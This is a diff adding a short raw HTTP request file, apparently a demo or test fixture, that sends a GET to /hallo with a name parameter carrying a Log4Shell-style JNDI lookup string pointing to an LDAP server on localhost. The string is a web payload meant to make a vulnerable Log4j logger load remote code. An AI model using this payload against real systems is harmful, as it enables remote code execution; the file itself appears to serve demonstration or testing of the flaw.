@@ -1,0 +1,2 @@
+GET /hallo?name=${jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de}
+Host: localhost:8000
